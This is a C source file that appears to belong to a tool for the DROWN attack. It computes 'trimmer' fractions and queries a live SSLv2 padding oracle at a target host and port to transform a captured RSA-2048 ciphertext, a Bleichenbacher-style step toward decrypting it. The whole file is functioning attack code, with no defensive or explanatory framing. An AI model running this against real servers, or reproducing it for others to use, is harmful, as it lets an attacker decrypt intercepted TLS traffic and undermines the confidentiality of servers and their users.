#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <openssl/bn.h>
#include <assert.h>
#include <string.h>
#include "utils.h"
#include "trimmers.h"
#include "oracle.h"

int gcd(int a, int b)
{
    int temp;
    while (b != 0)
    {
        temp = a % b;

        a = b;
        b = temp;
    }
    return a;
}

double p(couple_t *c)
{
    return 3. / c->t - 2. / c->u;
}

int pcomp(const void *elem1, const void *elem2)
{
    double p1 = p((couple_t *)elem1);
    double p2 = p((couple_t *)elem2);

    return (p1 < p2) - (p1 > p2);
}

int fillCouples(int n, couple_t *couples)
{
    // Compute x so that there is approximately n couples with P(u, t) >= x
    double x = 1. / (5. * sqrt(n));
    int g = 0;

    for(int t = 2; t < 1./x; t++)
    {
        for(int u = ceil(2. / (3. / t - x)); u < t; u++)
        {
            if(gcd(u, t) == 1)
            {
                couples[g].u = u;
                couples[g].t = t;
                if(++g >= n)
                    return g;
            }
        }
    }
    return g;
}


void trimmers_new(trimmers_t * trimmers, int n)
{
    trimmers->couples = malloc(n * sizeof(couple_t));
    MY_ASSERT(trimmers->couples != NULL, "Could not allocate trimmers");
    trimmers->n = fillCouples(n, trimmers->couples);
}

void trimmers_free(trimmers_t * trimmers)
{
    free(trimmers->couples);
}

int oracle(drown_ctx *dctx, BIGNUM *c)
{
    // Assume RSA-2048
    unsigned char enc_key[256];
    int pad = 256 - BN_num_bytes(c);
    memset(enc_key, 0, pad);
    BN_bn2bin(c, enc_key + pad);

    return run_oracle_valid_multiple(dctx->hostport, enc_key, 256);
}

/*
    Given a correctly padded ciphertext c0, try to find s
    so that c1 = c0 * (s ** e) is a correctly padded ciphertext.
*/
int find_trimmer(drown_ctx *dctx, trimmers_t *trimmers)
{
    int res = 0;

    // Get our variables from the context
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *e = dctx->e;

    // Initialize temporary variables
    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *u = BN_CTX_get(ctx);
    BIGNUM *t = BN_CTX_get(ctx);
    BIGNUM *t_1 = BN_CTX_get(ctx);
    BIGNUM *s = BN_CTX_get(ctx);
    BIGNUM *se = BN_CTX_get(ctx);
    BIGNUM *cc = BN_CTX_get(ctx);

    // Try all couples until we find a good trimmer
    for(int i = 0; i < trimmers->n; i++)
    {
        // We compute cc = c * (u / t) ** e [mod n]
        BN_set_word(u, trimmers->couples[i].u);
        BN_set_word(t, trimmers->couples[i].t);
        BN_mod_inverse(t_1, t, n, ctx);
        BN_mod_mul(s, u, t_1, n, ctx);
        BN_mod_exp(se, s, e, n, ctx);
        BN_mod_mul(cc, c, se, n, ctx);
        if(oracle(dctx, cc))
        {
            fprintf(stderr, "Got trimmer (%d, %d)\n", trimmers->couples[i].u, trimmers->couples[i].t);
            res = 1;
            break;
        }


        /*
        Instead of recomputing with u and t swapped, we can reuse s^e
        */
        BN_mod_inverse(se, se, n, ctx);
        BN_mod_mul(cc, c, se, n, ctx);
        if(oracle(dctx, cc))
        {
            // We recompute s only if needed
            BN_mod_inverse(s, s, n, ctx);
            fprintf(stderr, "Got trimmer (%d, %d)\n", trimmers->couples[i].t, trimmers->couples[i].u);
            res = 1;
            break;
        }
    }

    if(res)
    {
        // Update values of dctx
        BN_copy(dctx->c, cc);
        BN_mod_mul(dctx->s, dctx->s, s, n, ctx);
    }

    BN_CTX_end(ctx);

    return res;
}

